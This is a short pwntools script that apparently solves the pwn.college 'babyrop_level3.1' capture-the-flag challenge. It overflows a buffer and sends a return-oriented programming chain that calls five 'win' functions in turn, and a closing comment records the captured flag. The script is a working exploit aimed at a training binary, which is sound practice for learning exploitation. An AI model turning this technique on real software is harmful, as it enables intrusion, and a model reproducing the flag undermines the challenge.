from pwn import *

elf = ELF("./babyrop_level3.1")
s = ssh(host="dojo.pwn.college", user="hacker", keyfile="~/key")
pop_rdi = 0x00000000004025d3
win1 = elf.sym['win_stage_1']
win2 = elf.sym['win_stage_2']
win3 = elf.sym['win_stage_3']
win4 = elf.sym['win_stage_4']
win5 = elf.sym['win_stage_5']

io = s.process("/challenge/babyrop_level3.1")
chain = b'a'*0x38
chain += p64(pop_rdi) + p64(1) + p64(win1)
chain += p64(pop_rdi) + p64(2) + p64(win2)
chain += p64(pop_rdi) + p64(3) + p64(win3)
chain += p64(pop_rdi) + p64(4) + p64(win4)
chain += p64(pop_rdi) + p64(5) + p64(win5)

io.send(chain)
io.interactive()
# Flag: pwn.college{s42uM9jPZij0pvQCfPIcl03vNuy.0lN0MDLxIjNyEzW}